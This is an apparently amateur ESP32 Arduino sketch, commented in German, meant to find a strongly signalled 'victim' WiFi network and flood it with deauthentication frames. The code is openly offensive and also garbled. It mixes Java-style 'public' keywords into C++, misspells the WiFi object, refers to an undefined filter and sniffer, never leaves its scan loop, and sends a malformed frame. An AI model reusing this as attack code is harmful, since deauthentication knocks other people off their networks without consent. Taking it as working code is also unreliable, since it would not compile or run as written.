# include <WiFi.h>
# include <esp_wifi.h>
# include <esp_wifi_types.h>



void setup() {
  int pwnd_networks[3];
}

public void find_network() {
  public string victim_ssid = "";

  while (1){
    int available_networks = WiFi.scanNetworks();
    for (int i=0; i<=available_networks; i++){
      if(WiFi.encryptionType(i)!=7 && WiFi.RSSI(i)>=-60){
        victim_ssid = WiFi.SSID(i);
        break;
      }
    }
  }

}

public void deauth_attack(){
  Wifi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  int count = 0;
  do
  {
    // Das Packet mit Deauth-Frame
    uint8_t packet[] = {0xC0, 0x00, 0x00, 0x00, 0x01, 0x02, 0xC0, 0x00, 0x00, 0x00, 0x01, 0x02, 0x00, 0x00};
    // Sendet das Packet
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    //wartet 100ms
    delay(100);
    //erhöht den Counter bis er 50 erreicht hat
    //heißt er sendet 50 Deauth-Packets
    //sollte nach testen adjustet werden damit er nicht zu viele sendet
    count++;
  } while (count < 50);
  

}


void loop() {



}
